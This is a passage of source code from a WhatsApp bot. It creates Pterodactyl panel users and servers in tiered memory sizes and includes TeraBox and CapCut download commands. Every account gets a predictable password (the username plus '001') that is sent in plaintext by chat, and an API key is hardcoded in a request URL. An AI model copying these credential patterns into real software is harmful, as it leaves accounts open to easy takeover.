"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}

break
case '4gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "4110"
let cpu = "120"
let disk = "4110"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]} 

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
PLEASE SAVE YOUR ACCOUNT CAREFULLY
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}

break
case '5gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "5130"
let cpu = "150"
let disk = "5130"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
PLEASE SAVE YOUR ACCOUNT CAREFULLY
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}

break
case '6gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "6050"
let cpu = "180"
let disk = "6050"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
PLEASE SAVE YOUR ACCOUNT CAREFULLY
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}

break
case '7gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "7050"
let cpu = "210"
let disk = "7050"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
PLEASE SAVE YOUR ACCOUNT CAREFULLY
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}

break
case '8gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "8050"
let cpu = "240"
let disk = "8050"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
PLEASE SAVE YOUR ACCOUNT CAREFULLY
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}

break
case '9gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "9050"
let cpu = "270"
let disk = "9050"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
PLEASE SAVE YOUR ACCOUNT CAREFULLY
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}

break
case '10gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "10050"
let cpu = "300"
let disk = "10050"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
PLEASE SAVE YOUR ACCOUNT CAREFULLY
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}

break
case 'unli': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
PLEASE SAVE YOUR ACCOUNT CAREFULLY
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}
break
//==================================================================
case 'hdvid' :
case 'vidhd' : {
  reply('_The process.... may take quite a long time. Please just wait around 4-8 minutes')
  NanoHDvideo()
}
break
//==================================================================
case 'terabox':
case 'teraboxdl': {
  if(!text) return reply('wheres the link?')
reply(mess.wait)
  const response = await fetch(`https://api.alyachan.dev/api/terabox?url=${encodeURIComponent(text)}&apikey=manz.alien`);
const data = await response.json();
const downloadLink = data.data.url;
const caption = data.data.filename;
const responseHeaders = response.headers;
const mimeType = responseHeaders.get('content-type');
Dare.sendMessage(m.chat, { document: { url: downloadLink, mimetype: mimeType }, fileName: caption }, { quoted: m });

}
break
//==================================================================
case 'capcut':{
if (!text) return replydare(`Masukkan tautan\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762 language=en&region=ID`)
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://itzpire.com/download/capcut?url=${encodeURIComponent(text)}`)
const vidnyabg = anu.data.originalVideoUrl;
const capnya = `_Succes download by ${botname}_\nTitle: ${anu.data.title}`
Dare.sendMessage(m.chat, { video: { url: vidnyabg}, caption: capnya}, {quoted: m})
await Dare.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await Dare.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break 
//==================================================================
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
